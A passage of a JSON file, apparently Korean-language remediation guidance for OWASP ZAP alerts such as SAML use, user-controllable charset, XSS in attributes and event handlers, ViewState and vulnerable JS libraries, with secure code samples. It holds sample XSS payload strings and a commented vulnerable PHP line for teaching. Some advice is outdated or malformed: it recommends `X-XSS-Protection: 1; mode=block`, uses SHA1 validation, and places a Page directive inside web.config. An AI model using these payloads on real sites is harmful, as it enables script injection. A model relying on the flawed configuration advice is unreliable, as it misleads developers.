File\" name=\"submit\">\n    </form>\n    \";\n}\n?>"
  },
  "Use of SAML": {
    "translated": "SAML 사용 – SAML(Security Assertion Markup Language)이 사용되고 있음 (잘못 구현될 경우 취약점이 발생할 수 있음)",
    "description": "ZAP이 웹 애플리케이션에서 SAML(Security Assertion Markup Language) 사용을 감지했음을 나타내는 정보성 알림입니다. SAML은 Single Sign-On (SSO)에 널리 사용되는 표준이지만, 잘못 구현될 경우 다양한 보안 취약점(예: XML 외부 엔티티, XML 서명 무효화, Replay 공격)에 노출될 수 있습니다.",
    "solution_guidelines": [
      "**SAML 구현 라이브러리/프레임워크 최신화:** 사용 중인 SAML 라이브러리(예: Spring Security SAML, OneLogin's SAML toolkit)를 항상 최신 버전으로 유지하여 알려진 취약점에 대한 패치를 적용합니다.",
      "**강력한 XML 유효성 검사:** SAML Assertion의 XML 스키마 유효성 검사를 수행하고, XML 외부 엔티티(XXE) 공격을 방지하기 위해 외부 엔티티 처리를 비활성화합니다.",
      "**XML 서명 및 암호화 검증:** Assertion 및 Response에 대한 XML 서명을 철저히 검증하여 메시지 무결성과 발신자 신뢰성을 확보하고, 민감한 정보는 암호화하여 전송합니다.",
      "**Replay 공격 방지:** `NotOnOrAfter`, `NotBefore` 조건, Unique ID 추적 등을 통해 SAML Assertion의 재사용(Replay 공격)을 방지합니다.",
      "**SAML 설정 메타데이터 관리:** SAML 서비스 공급자(SP) 및 ID 공급자(IdP)의 메타데이터(인증서, 엔드포인트 등)를 안전하게 관리하고 주기적으로 업데이트합니다.",
      "**클락 스큐(Clock Skew) 관리:** IdP와 SP 간의 시간 동기화 문제를 고려하여 `NotOnOrAfter` 및 `NotBefore` 조건에 약간의 허용 오차를 둡니다."
    ],
    "example_code_general": "(This is an informational alert. Secure SAML implementation relies heavily on using well-maintained libraries and following best practices for XML processing and cryptographic validation.)\n\n// Example: XML External Entity (XXE) prevention in Java (relevant for SAML processing)\n// (Similar to the SOAP XML Injection example)\nimport javax.xml.parsers.DocumentBuilderFactory;\n\npublic class SecureSAMLXMLParsing {\n    public static DocumentBuilderFactory getSecureDocumentBuilderFactory() {\n        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n        try {\n            // XXE 방지 설정 (매우 중요)\n            dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n            dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\n            dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\n            dbf.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\n            dbf.setXIncludeAware(false);\n            dbf.setExpandEntityReferences(false);\n        } catch (ParserConfigurationException e) {\n            e.printStackTrace();\n        }\n        return dbf;\n    }\n}"
  },
  "User Agent Fuzzer": {
    "translated": "사용자 에이전트 퍼저 – 사용자 에이전트 문자열을 무작위로 변경하여 테스트",
    "description": "ZAP의 User Agent Fuzzer는 User-Agent HTTP 헤더를 다양한 값으로 변경하여 전송했음을 나타내는 정보성 알림입니다. 이는 웹 서버나 애플리케이션이 User-Agent 헤더를 처리하는 방식에서 잠재적인 취약점(예: 정보 유출, 오작동)을 발견하기 위한 테스트의 일부입니다. 이 자체는 취약점이 아닙니다.",
    "solution_guidelines": [
      "**User-Agent 헤더 신뢰 금지:** User-Agent 헤더에 포함된 정보를 보안 결정(예: 접근 제어, 로깅)에 직접적으로 사용하지 않습니다. 이 헤더는 클라이언트에서 쉽게 변조될 수 있습니다.",
      "**입력값 유효성 검사:** User-Agent 헤더의 값을 로그나 다른 시스템에 저장할 경우, 불필요한 문자나 너무 긴 문자열이 저장되지 않도록 유효성 검사 또는 길이 제한을 적용합니다.",
      "**오류 처리 견고화:** 웹 서버나 애플리케이션이 비정상적이거나 악의적인 User-Agent 문자열을 받았을 때 오류를 발생시키거나 비정상적인 동작을 하지 않도록 견고하게 설계합니다."
    ],
    "example_code_general": "(This is an informational alert. Solutions relate to general robust input handling.)"
  },
  "User Controllable Charset": {
    "translated": "사용자 제어 가능한 문자셋 – 웹 페이지의 문자 인코딩을 사용자가 제어할 수 있어 XSS나 콘텐츠 스니핑 공격에 악용될 수 있음",
    "description": "사용자가 HTTP 응답의 `Content-Type` 헤더에 있는 `charset` 값을 제어할 수 있음을 나타냅니다. 공격자는 이를 통해 브라우저가 응답을 다른 인코딩으로 해석하도록 강제하여 XSS(Cross-Site Scripting) 또는 데이터 변조 공격을 유발할 수 있습니다 (예: UTF-7 XSS).",
    "solution_guidelines": [
      "**문자셋은 서버에서 명시적으로 설정:** 응답의 문자셋은 항상 서버 측에서 명시적으로 정의하고, 사용자 입력에 의해 변경되지 않도록 합니다. 일반적으로 `UTF-8`을 사용하는 것이 권장됩니다.",
      "**`Content-Type` 헤더 고정:** `Content-Type` 헤더(특히 `charset` 부분)가 사용자 입력으로 인해 조작될 수 없도록 강력하게 제한합니다.",
      "**`X-Content-Type-Options: nosniff` 헤더 추가:** 이 헤더는 브라우저가 서버가 선언한 `Content-Type`을 무시하고 MIME 스니핑(MIME Sniffing)을 통해 콘텐츠 유형을 추론하는 것을 방지합니다. 이는 `User Controllable Charset`과 직접적인 관련은 없지만, `Content-Type` 조작 방지에 중요한 보조 헤더입니다.",
      "**모든 출력 인코딩:** 사용자 입력이 HTML 페이지에 출력되기 전에 항상 적절한 HTML 엔티티 인코딩을 수행하여 XSS 공격을 방지합니다."
    ],
    "example_code_php": "<?php\n// PHP Secure Charset Setting\n// Content-Type 헤더를 명시적으로 UTF-8로 설정\nheader('Content-Type: text/html; charset=UTF-8');\nheader('X-Content-Type-Options: nosniff'); // MIME 스니핑 방지\n\n$userInput = $_GET['input'] ?? '';\n\n// 사용자 입력을 안전하게 출력 (HTML 엔티티 인코딩)\necho '<div>' . htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8') . '</div>';\n\n// // 취약한 예시 (절대 사용 금지)\n// header('Content-Type: text/html; charset=' . $_GET['charset']);\n?>",
    "example_code_java_servlet": "// Java Servlet Secure Charset Setting\nresponse.setContentType(\"text/html; charset=UTF-8\");\nresponse.setHeader(\"X-Content-Type-Options\", \"nosniff\");\n\nString userInput = request.getParameter(\"input\");\nif (userInput != null) {\n    // 사용자 입력을 안전하게 출력 (HTML 엔티티 인코딩)\n    // Spring Framework 등은 기본적으로 자동 이스케이프를 제공\n    // JSP: <c:out value=\"${userInput}\" escapeXml=\"true\" />\n    // Raw Servlet:\n    // out.println(\"<div>\" + org.owasp.encoder.Encode.forHtml(userInput) + \"</div>\");\n}"
  },
  "User Controllable HTML Element Attribute (Potential XSS)": {
    "translated": "사용자 제어 가능한 HTML 요소 속성 (잠재적 XSS) – 사용자 입력이 HTML 요소의 속성 값에 그대로 반영되어 XSS 공격에 악용될 수 있음",
    "description": "사용자 입력이 HTML 요소의 속성 값으로 직접 사용될 수 있음을 나타냅니다. 이는 공격자가 속성 내부에 악성 JavaScript 코드를 주입하여 XSS(Cross-Site Scripting) 공격을 유발할 수 있는 취약점입니다.",
    "solution_guidelines": [
      "**HTML 속성 값 인코딩:** 사용자 입력을 HTML 요소의 속성 값으로 사용하기 전에 항상 해당 속성의 컨텍스트에 맞는 적절한 인코딩을 수행합니다. 예를 들어, `href` 속성에는 URL 인코딩을, 일반 속성에는 HTML 속성 인코딩을 적용합니다.",
      "**화이트리스트 기반 유효성 검사:** 속성 값이 예상되는 값의 집합에만 포함되는지 화이트리스트 방식으로 검증합니다. (예: `target` 속성에 `_blank`만 허용)",
      "**자바스크립트 스키마 허용 금지:** `href`나 `src`와 같은 URL 속성에서 `javascript:` 스키마를 포함하는 사용자 입력은 절대 허용하지 않습니다.",
      "**콘텐츠 보안 정책 (CSP) 사용:** `script-src`, `object-src` 등의 CSP 지시어를 사용하여 인라인 스크립트 실행 및 신뢰할 수 없는 출처로부터의 자원 로드를 제한합니다."
    ],
    "example_code_html_and_javascript": "<a href=\"<c:out value='${userInput}' escapeXml='true' />\">Click Me</a>\n<div style=\"background: url('<c:out value='${userInput}' escapeXml='true' />');\"></div>\n<img src=\"<c:out value='${userInput}' escapeXml='true' />\" alt=\"Image\">\n\n<script>\n    const userUrl = \"javascript:alert('XSS')\"; // 사용자 입력으로 주입될 수 있는 값\n    const safeUrl = encodeURI(userUrl); // 부분적으로 안전, 하지만 javascript: 스키마는 여전히 위험\n    // 안전한 방법: 스키마 검증 및 화이트리스트\n    if (userUrl.startsWith('http://') || userUrl.startsWith('https://')) {\n        document.getElementById('myLink').href = userUrl;\n    } else {\n        document.getElementById('myLink').href = '#'; // 기본값 또는 오류 처리\n    }\n</script>"
  },
  "User Controllable JavaScript Event (XSS)": {
    "translated": "사용자 제어 가능한 JavaScript 이벤트 (XSS) – 사용자 입력이 JavaScript 이벤트 핸들러(예: onclick)에 삽입되어 XSS 공격에 악용될 수 있음",
    "description": "사용자 입력이 HTML 요소의 JavaScript 이벤트 핸들러(예: `onclick`, `onmouseover`)로 직접 주입될 수 있음을 나타냅니다. 이는 공격자가 임의의 JavaScript 코드를 실행하여 XSS(Cross-Site Scripting) 공격을 유발할 수 있는 심각한 취약점입니다.",
    "solution_guidelines": [
      "**JavaScript 이벤트 핸들러에 사용자 입력 직접 사용 금지:** HTML 태그의 `on*` 속성(예: `onclick`, `onerror`, `onload`)에 사용자 입력을 직접 삽입하는 것을 절대적으로 피합니다.",
      "**콘텐츠 보안 정책 (CSP) 사용:** `script-src 'self' 'unsafe-inline'`을 사용하지 않고 `script-src 'self'` 또는 `script-src 'nonce-...'`를 사용하여 인라인 스크립트 실행을 제한합니다. 이는 `on*` 이벤트 핸들러를 통한 XSS 공격을 상당 부분 완화합니다.",
      "**데이터와 코드 분리:** 사용자 데이터를 JavaScript 코드로 해석되지 않도록 처리합니다. 데이터를 표시할 때는 `textContent`를 사용하고, 속성에는 적절한 인코딩을 적용합니다.",
      "**이벤트 리스너 사용:** HTML 태그에 직접 `on*` 속성을 사용하는 대신, JavaScript에서 `addEventListener`를 사용하여 동적으로 이벤트 핸들러를 바인딩합니다. 이 때 사용자 입력은 데이터로만 처리하고 코드로 실행되지 않도록 합니다."
    ],
    "example_code_html_and_javascript_secure": "<button id=\"myButton\">Click Me</button>\n<div id=\"output\"></div>\n\n<script>\n    const userInput = \"<img src=x onerror=alert('XSS')>\"; // 사용자 입력 (악성 데이터)\n\n    // 안전한 방법: DOM 요소의 textContent를 사용하여 데이터를 삽입 (XSS 방지)\n    document.getElementById('output').textContent = userInput;\n\n    // 안전한 방법: addEventListener를 사용하여 이벤트 핸들러 바인딩\n    // 사용자 입력은 코드가 아닌 데이터로만 사용\n    document.getElementById('myButton').addEventListener('click', function() {\n        alert('Button clicked! User input: ' + userInput); // 사용자 입력은 문자열로만 사용\n    });\n\n    // CSP 헤더 예시 (서버 설정에서 추가)\n    // Content-Security-Policy: script-src 'self' 'nonce-randomstring';\n    // 이렇게 설정하면 인라인 스크립트는 nonce가 일치하는 경우에만 실행됩니다.\n    // 하지만 on* 이벤트 핸들러는 nonce를 적용하기 어렵기 때문에 사용을 피하는 것이 좋습니다.\n</script>"
  },
  "Username Hash Found": {
    "translated": "사용자명 해시 발견 – 사용자 이름의 해시 값이 노출됨",
    "description": "응답에 사용자 이름의 해시 값이 포함되어 있음을 나타내는 정보성 알림입니다. 사용자 이름의 해시 값이 노출되는 것은 직접적인 보안 취약점은 아니지만, 특정 상황에서는 공격자가 유추 공격(예: 레인보우 테이블, 무차별 대입 공격)을 통해 원본 사용자 이름을 알아내거나, 사용자 이름을 기반으로 다른 시스템에 대한 공격을 시도하는 데 사용될 수 있습니다.",
    "solution_guidelines": [
      "**사용자 이름 해시 노출 최소화:** 사용자 이름의 해시 값을 웹 페이지나 API 응답에 노출할 필요가 없다면 제거합니다.",
      "**강력한 해싱 알고리즘 사용:** 불가피하게 사용자 이름 해시를 노출해야 하는 경우, SHA-256 또는 SHA-3와 같은 강력한 암호화 해싱 알고리즘을 사용하고, 솔트(salt)를 적용하여 레인보우 테이블 공격을 어렵게 합니다.",
      "**다른 식별자 사용:** 사용자 이름을 해시하는 대신, 사용자에게는 노출되지 않는 고유한 ID나 UUID를 사용하여 식별하는 것을 고려합니다.",
      "**비밀번호 해시와의 혼동 방지:** 사용자 이름 해시와 비밀번호 해시는 명확히 구분되어야 합니다. 비밀번호는 훨씬 더 강력한 해싱(예: bcrypt, scrypt, Argon2)을 사용해야 합니다."
    ],
    "example_code_python_hash_username": "import hashlib\nimport os\n\ndef hash_username(username, salt=None):\n    if salt is None:\n        salt = os.urandom(16) # 16바이트 랜덤 솔트 생성\n\n    # 솔트와 사용자 이름을 결합하여 해시\n    hashed_username = hashlib.sha256(salt + username.encode('utf-8')).hexdigest()\n    \n    # 해시 값과 솔트를 함께 저장하거나 전송 (솔트 없이는 무의미)\n    # 실제로는 해시값만 노출하기보다는, 해당 사용자를 식별할 다른 수단 마련\n    return hashed_username, salt.hex()\n\n# 사용 예시\n# username = \"testuser\"\n# hashed_user, user_salt = hash_username(username)\n# print(f\"Hashed Username: {hashed_user}\")\n# print(f\"Salt: {user_salt}\")"
  },
  "Username Hash Found in WebSocket message": {
    "translated": "웹소켓 메시지 내 사용자명 해시 발견 – 웹소켓 메시지 안에 사용자 이름의 해시 값이 노출됨",
    "description": "WebSocket 메시지를 통해 사용자 이름의 해시 값이 노출되고 있음을 나타내는 정보성 알림입니다. 웹 소켓 통신은 지속적인 양방향 통신에 사용되므로, 여기에 사용자 이름 해시가 포함될 경우 더 많은 공격 노출 기회가 생길 수 있습니다.",
    "solution_guidelines": [
      "**WebSocket을 통한 민감 정보 전송 최소화:** WebSocket 메시지에 사용자 이름 해시와 같은 민감한 정보는 가능한 한 포함하지 않도록 합니다.",
      "**WebSocket 통신 암호화 (WSS):** WebSocket 통신은 항상 `wss://` 프로토콜을 사용하여 암호화(TLS)되어야 합니다.",
      "**강력한 해싱 알고리즘 및 솔트 적용:** 사용자 이름 해시가 불가피하게 노출된다면, 강력한 암호화 해싱 알고리즘(SHA-256 이상)을 사용하고, 각 사용자마다 고유한 솔트(salt)를 적용하여 무차별 대입 공격을 어렵게 합니다.",
      "**다른 식별자 사용:** 사용자 이름 해시 대신, 노출되지 않는 세션 ID나 임시 토큰, UUID 등을 통해 사용자를 식별하는 것을 고려합니다.",
      "**WebSocket 메시지 로깅 주의:** WebSocket 메시지가 서버 로그에 기록될 경우, 민감한 정보가 노출되지 않도록 로그 설정을 검토합니다."
    ],
    "example_code_general": "(Solutions are similar to \"Username Hash Found\", with an emphasis on securing WebSocket communication.)\n\n// Example: Secure WebSocket connection URL\n// wss://yourdomain.com/websocket-endpoint"
  },
  "Verification Request Identified": {
    "translated": "확인 요청 식별 – 인증 또는 데이터 유효성 검증과 관련된 요청이 감지됨",
    "description": "ZAP이 애플리케이션에서 일종의 '인증/확인 요청'(예: 이메일 인증, 비밀번호 재설정 확인)을 감지했음을 나타내는 정보성 알림입니다. 이러한 요청은 특정 유형의 공격(예: 계정 탈취, 이메일 주소 열거)에 취약할 수 있으므로 주의 깊은 검토가 필요합니다.",
    "solution_guidelines": [
      "**고유하고 예측 불가능한 토큰 사용:** 이메일 인증, 비밀번호 재설정 등에 사용되는 모든 토큰은 충분히 길고 무작위성이 높으며 예측 불가능해야 합니다.",
      "**토큰의 유효 기간 제한:** 토큰은 짧은 시간(예: 15~60분) 동안만 유효하도록 제한하여 재사용이나 무차별 대입 공격 기회를 줄입니다.",
      "**단일 사용 토큰 (One-Time Token):** 토큰은 한 번만 사용 가능하도록 구현하여, 사용 후에는 즉시 무효화되도록 합니다.",
      "**이메일/사용자 이름 열거 방지:** '해당 이메일 주소를 가진 사용자가 없습니다.'와 같은 구체적인 오류 메시지 대신, '비밀번호 재설정 지침이 이메일로 전송되었습니다.'와 같이 일반적인 메시지를 사용하여 사용자 이름 열거를 방지합니다.",
      "**비밀번호 재설정 절차 강화:** 비밀번호 재설정 시 질문-답변 방식 대신, 이메일/SMS 확인 또는 다단계 인증을 적극적으로 사용합니다.",
      "**비밀번호 재설정 링크에 사용자 정보 포함 금지:** 비밀번호 재설정 링크 URL에 사용자 이름이나 ID를 직접 포함하지 않고, 토큰만 포함합니다."
    ],
    "example_code_python_token_generation": "import secrets\nimport time\n\ndef generate_secure_token(length=32):\n    # 충분히 길고 무작위성이 높은 토큰 생성\n    return secrets.token_urlsafe(length)\n\ndef create_password_reset_link(user_id):\n    token = generate_secure_token()\n    expiry_time = int(time.time()) + 3600 # 1시간 유효\n\n    # 데이터베이스에 user_id, token, expiry_time 저장 (단일 사용, 만료 시간 확인)\n    # save_reset_token_to_db(user_id, token, expiry_time)\n\n    # 링크에는 토큰만 포함\n    return f\"https://yourdomain.com/reset_password?token={token}\"\n\n# 사용 예시\n# reset_link = create_password_reset_link(123)\n# print(reset_link)"
  },
  "Viewstate": {
    "translated": "ViewState – ASP.NET의 ViewState(웹 페이지 상태 저장) 사용이 감지됨",
    "description": "ASP.NET 애플리케이션에서 ViewState가 사용되고 있음을 나타내는 정보성 알림입니다. ViewState는 웹 페이지의 상태를 유지하는 데 사용되는 메커니즘이지만, 암호화나 MAC 서명이 적용되지 않으면 정보 유출 및 변조 공격에 취약할 수 있습니다.",
    "solution_guidelines": [
      "**ViewState에 민감 정보 저장 금지:** 절대로 개인 식별 정보(PII), 자격 증명, 세션 토큰 등 민감한 정보를 ViewState에 직접 저장하지 않습니다.",
      "**ViewState 암호화 및 MAC 서명 활성화:** ViewState의 암호화(Encryption)와 MAC(Message Authentication Code) 서명을 활성화하여 변조 및 정보 유출을 방지합니다. `machineKey` 설정을 통해 이루어집니다.",
      "**ViewState 최소화:** ViewState의 크기를 줄여 성능을 향상시키고, 공격 노출 영역을 줄입니다. `EnableViewState=\"false\"` 속성을 사용하여 불필요한 컨트롤의 ViewState를 비활성화합니다.",
      "**ViewState 대신 다른 상태 관리 기술 고려:** 세션, 데이터베이스, 캐시 등 서버 측 상태 관리 기술을 사용하여 민감 정보를 관리하는 것을 고려합니다."
    ],
    "example_code_aspnet_web_config": "<system.web>\n    <machineKey validationKey=\"AutoGenerate,IsolateApps\" decryptionKey=\"AutoGenerate,IsolateApps\"\n              validation=\"SHA1\" decryption=\"Auto\" />\n    \n    <%@ Page EnableViewState=\"false\" %>\n</system.web>"
  },
  "Viewstate without MAC Signature (Sure)": {
    "translated": "ViewState MAC 서명 없음 (확실) – ASP.NET ViewState가 MAC(Message Authentication Code) 서명 없이 사용되어 변조 여부 확인이 불가능함",
    "description": "ASP.NET ViewState에 MAC(Message Authentication Code) 서명이 적용되지 않았음이 확실하게 확인된 경우입니다. MAC 서명이 없으면 공격자가 ViewState 데이터를 쉽게 변조하여 애플리케이션의 상태를 조작하거나 비즈니스 로직을 우회할 수 있습니다. 이는 심각한 취약점입니다.",
    "solution_guidelines": [
      "**`machineKey` 설정에서 `validation` 활성화:** `web.config` 파일의 `<system.web>` 섹션 내 `<machineKey>` 요소에서 `validation` 속성을 `SHA1`, `AES`, `3DES` 등으로 설정하여 MAC 서명을 활성화합니다. `AutoGenerate,IsolateApps`는 개발에 편리하지만, 프로덕션 환경에서는 명시적이고 강력한 키를 사용하는 것이 좋습니다.",
      "**ViewState에 민감 정보 저장 금지:** MAC 서명이 있더라도 ViewState에 민감한 정보를 저장하는 것은 피해야 합니다. MAC은 무결성을 보장하지만 암호화를 제공하지는 않습니다 (암호화는 `decryption` 속성으로 제어).",
      "**ViewState 암호화도 함께 활성화:** `decryption` 속성도 함께 설정하여 ViewState 데이터를 암호화하여 정보 유출도 방지합니다."
    ],
    "example_code_aspnet_web_config": "<system.web>\n    <machineKey validationKey=\"AutoGenerate,IsolateApps\" decryptionKey=\"AutoGenerate,IsolateApps\"\n              validation=\"SHA1\" decryption=\"Auto\" />\n    </system.web>"
  },
  "Viewstate without MAC Signature (Unsure)": {
    "translated": "ViewState MAC 서명 없음 (불확실) – ASP.NET ViewState가 MAC 서명 없이 사용될 가능성이 있음 (변조 여부 확인이 불확실함)",
    "description": "ZAP이 ViewState에 MAC(Message Authentication Code) 서명이 적용되었는지 확실하게 판단할 수 없는 경우입니다. 이는 MAC이 적용되었을 수도 있지만, ZAP이 탐지하기 어려운 방식으로 구현되었거나, 비표준 방식일 수 있음을 의미합니다. 여전히 MAC 서명이 누락되어 있을 가능성이 있으므로 수동 검증이 필요합니다.",
    "solution_guidelines": [
      "**수동으로 `machineKey` 설정 확인:** `web.config` 파일의 `<machineKey>` 요소에서 `validation` 속성이 올바르게 설정되어 있는지 수동으로 확인합니다. `validation` 속성이 `SHA1`, `AES`, `3DES` 등으로 설정되어 있어야 합니다.",
      "**ViewState에 대한 보안 검토 재실시:** MAC 서명이 적용되지 않았을 가능성을 염두에 두고, ViewState에 민감 정보가 포함되어 있는지, 변조 공격에 취약한지 다시 한번 면밀히 검토합니다.",
      "**관련 정보 확인:** 이 경고는 명확한 `Sure` 경고가 아니므로, 실제 MAC이 적용되었는지 확인하기 위해 추가적인 분석(예: ViewState 디코더 사용, 애플리케이션 코드 검토)이 필요합니다.",
      "**`Viewstate without MAC Signature (Sure)`와 동일한 해결책 적용:** MAC 서명이 없는 것으로 확인되면, 위 `Viewstate without MAC Signature (Sure)`의 해결책을 적용해야 합니다."
    ],
    "example_code_aspnet_web_config_review": "<system.web>\n    <machineKey validationKey=\"AutoGenerate,IsolateApps\" decryptionKey=\"AutoGenerate,IsolateApps\"\n              validation=\"SHA1\" decryption=\"Auto\" />\n</system.web>"
  },
  "Vulnerable JS Library": {
    "translated": "취약한 JavaScript 라이브러리 – 알려진 취약점을 가진 JavaScript 라이브러리가 사용됨",
    "description": "웹 애플리케이션이 알려진 보안 취약점이 있는 JavaScript 라이브러리(예: jQuery, AngularJS, React, Lodash의 오래된 버전)를 사용하고 있음을 나타냅니다. 이러한 취약점은 XSS, DOM 조작, 정보 유출 등 다양한 클라이언트 측 공격으로 이어질 수 있습니다.",
    "solution_guidelines": [
      "**취약한 JS 라이브러리 업데이트:** 가장 중요하며 우선적인 해결책은 모든 JavaScript 라이브러리를 알려진 보안 취약점이 패치된 최신 안정 버전으로 즉시 업데이트하는 것입니다.",
      "**사용하지 않는 라이브러리 제거:** 애플리케이션에서 더 이상 사용하지 않는 오래된 또는 불필요한 JavaScript 라이브러리는 제거합니다.",
      "**라이브러리 사용 모니터링:** 빌드 프로세스에 Dependabot, OWASP Dependency-Check, Snyk, WhiteSource Renovate와 같은 종속성 스캐닝 도구를 통합하여 프로젝트의 모든 라이브러리에서 알려진 취약점을 지속적으로 모니터링합니다.",
      "**Subresource Integrity (SRI) 사용:** 외부 CDN에서 로드되는 JavaScript 라이브러리에 `integrity` 속성을 추가하여 파일 변조를 방지합니다. (관련: `Sub Resource Integrity Attribute Missing` 취약점)",
      "**콘텐츠 보안 정책 (CSP) 강화:** `script-src` 지시어를 사용하여 스크립트를 로드할 수 있는 신뢰할 수 있는 도메인을 명시적으로 제한합니다."
    ],
    "example_code_package_json_update": "{\n  \"name\": \"my-app\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"jquery\": \"3.6.0\",\n    \"lodash\": \"4.17.21\"\n  }\n}\n\n// npm update 또는 yarn upgrade 명령어로 종속성 업데이트\n// npm audit fix --force (취약점 자동 수정 시도)\n// yarn audit --fix (취약점 자동 수정 시도)",
    "example_code_html_sri": "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js\"\n        integrity=\"sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcSHGgXXLogjAltaAFzY4f3pnrNqInsCzzfCEFyqhbeIy6/XA==\"\n        crossorigin=\"anonymous\"></script>"
  },
  "WSDL File Detection": {
    "translated": "WSDL 파일 감지 – 웹 서비스 정의 언어(WSDL) 파일이 발견됨 (서비스 구조 파악에 이용될 수 있음)",
    "description": "ZAP이 웹 애플리케이션에서 WSDL(Web Services Description Language) 파일을 감지했음을 나타내는 정보성 알림입니다. WSDL 파일은 웹 서비스의 인터페이스(사용 가능한 작업, 메시지 형식 등)를 설명하며, 이는 서비스의 구조와 기능을 공격자에게 노출하여 공격 표면을 증가시킬 수 있습니다.",
    "solution_guidelines": [
      "**프로덕션 환경에서 WSDL 노출 제한:** WSDL 파일은 개발 및 테스트 단계에서 유용하지만, 프로덕션 환경에서는 외부에 노출되지 않도록 접근을 제한하거나 완전히 제거합니다.",
      "**접근 제어 강화:** 웹 서버나 애플리케이션 레벨에서 WSDL 파일에 대한 접근을 특정 IP 주소(예: 내부 네트워크) 또는 인증된 사용자에게만 허용하도록 제한합니다.",
      "**SOAP 서비스 보안 강화:** WSDL에 설명된 SOAP 서비스 자체에 대한 인증, 권한 부여, 입력값 유효성 검사를 철저히 적용합니다. (관련: `SOAP XML Injection` 취약점)",
      "**불필요한 정보 제거:** WSDL 파일에서 불필요한 내부 시스템 정보(예: 내부 IP 주소, 개발자 주석)가 포함되지 않도록 합니다."
    ],
    "example_code_web_server_config": "# Nginx 설정 예시 (WSDL 파일 접근 차단)\nlocation ~ \\.wsdl {\n    deny all;\n}\n\n# Apache 설정 예시 (.htaccess 또는 httpd.conf)\n<Files ~ \"\\.wsdl$\">\n    Order allow,deny\n    Deny from all\n</Files>"
  },
  "Weak Authentication Method": {
    "translated": "약한 인증 방식 – 비밀번호 길이 제한 없음, 단순한 비밀번호 허용 등 약한 인증 방식을 사용함",
    "description": "웹 애플리케이션이 약한 인증 방법을 사용하고 있음을 나타냅니다. 이는 무차별 대입 공격, 사전 공격, 쉬운 추측 등을 통해 사용자 계정이 탈취될 수 있는 위험을 증가시킵니다. 예시로는 약한 비밀번호 정책, 다단계 인증(MFA) 미사용, 세션 ID 예측 가능성 등이 있습니다.",
    "solution_guidelines": [
      "**강력한 비밀번호 정책 강제:** 최소 길이, 복잡성(대문자, 소문자, 숫자, 특수 문자 조합), 이전 비밀번호 재사용 금지 등의 강력한 비밀번호 정책을 사용자에게 강제합니다.",
      "**비밀번호 저장 시 강력한 해싱 알고리즘 사용:** 비밀번호는 평문으로 저장하지 않고, 솔트(salt)가 적용된 `bcrypt`, `scrypt`, `Argon2`와 같은 강력한 단방향 해싱 알고리즘을 사용하여 저장합니다.",
      "**다단계 인증(MFA) 활성화:** 사용자에게 다단계 인증(예: OTP, SMS 인증)을 활성화하도록 권장하거나 강제하여 계정 보안을 강화합니다.",
      "**비밀번호 무차별 대입 공격 방지:** 로그인 시도 실패 임계값 설정, 캡챠(CAPTCHA), 로그인 지연 등 무차별 대입 공격을 방어하는 메커니즘을 구현합니다.",
      "**예측 불가능한 세션 ID 사용:** 세션 ID는 충분히 길고 무작위성이 높아 예측 불가능하게 생성되어야 합니다.",
      "**로그인 시 세션 재생성:** 로그인 성공 시 세션 고정을 방지하기 위해 세션 ID를 재생성합니다.",
      "**인증 오류 메시지 일반화:** '사용자 이름이 잘못되었습니다.' 또는 '비밀번호가 잘못되었습니다.'와 같이 구체적인 오류 메시지를 제공하지 않고, '사용자 이름 또는 비밀번호가 잘못되었습니다.'와 같이 일반적인 메시지를 제공하여 사용자 이름 열거를 방지합니다.",
      "**보안 토큰 사용:** JWT, OAuth2 등 안전한 인증 토큰 메커니즘을 사용하고, 토큰의 유효 기간, 갱신 정책 등을 철저히 관리합니다."
    ],
    "example_code_python_bcrypt": "import bcrypt\n\ndef hash_password(password):\n    # 비밀번호 해시 (솔트 자동 생성 및 bcrypt 사용)\n    hashed = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())\n    return hashed.decode('utf-8')\n\ndef check_password(password, hashed_password):\n    # 비밀번호 검증\n    return bcrypt.checkpw(password.encode('utf-8'), hashed_password.encode('utf-8'))\n\n# 사용 예시\n# user_input_password = \"MyStrongPass123!\"\n# stored_hashed_password = hash_password(user_input_password)\n# print(f\"Hashed: {stored_hashed_password}\")\n\n# # 로그인 시도\n# if check_password(\"MyStrongPass123!\", stored_hashed_password):\n#     print(\"Password is correct.\")\n# else:\n#     print(\"Password is incorrect.\")"
  },
  "Web Browser XSS Protection Not Enabled": {
    "translated": "웹 브라우저 XSS 보호 비활성화 – X-XSS-Protection 헤더가 '0'으로 설정되어 브라우저의 내장 XSS 필터가 비활성화됨",
    "description": "`X-XSS-Protection` HTTP 응답 헤더가 설정되지 않았거나 `0`으로 설정되어 웹 브라우저의 내장 XSS 보호 기능이 비활성화되어 있음을 나타냅니다. 이 헤더는 오래된 브라우저에서 XSS 공격을 완화하는 데 도움이 될 수 있습니다.",
    "solution_guidelines": [
      "**`X-XSS-Protection` 헤더 설정:** `X-XSS-Protection: 1; mode=block` 헤더를 모든 HTTP 응답에 추가합니다. 이는 브라우저에게 XSS 공격이 감지되면 페이지 렌더링을 중단하도록 지시합니다.",
      "**콘텐츠 보안 정책 (CSP) 우선 적용:** `X-XSS-Protection` 헤더는 레거시 브라우저를 위한 것이므로, 더 강력하고 현대적인 `Content-Security-Policy` (CSP) 헤더를 우선적으로 사용하여 XSS 공격을 방지하는 것이 훨씬 중요하고 효과적입니다.",
      "**출력 인코딩 및 입력 유효성 검사:** 가장 기본적인 XSS 방어책은 사용자 입력을 안전하게 처리하고 모든 출력을 적절히 인코딩하는 것입니다. 헤더만으로는 모든 XSS를 막을 수 없습니다."
    ],
    "example_code_nginx": "# Nginx 설정 예시\nadd_header X-XSS-Protection \"1; mode=block\" always;",
    "example_code_apache": "# Apache httpd.conf 또는 .htaccess 예시\n<IfModule mod_headers.c>\n    Header always set X-XSS-Protection \"1; mode=block\"\n</IfModule>",
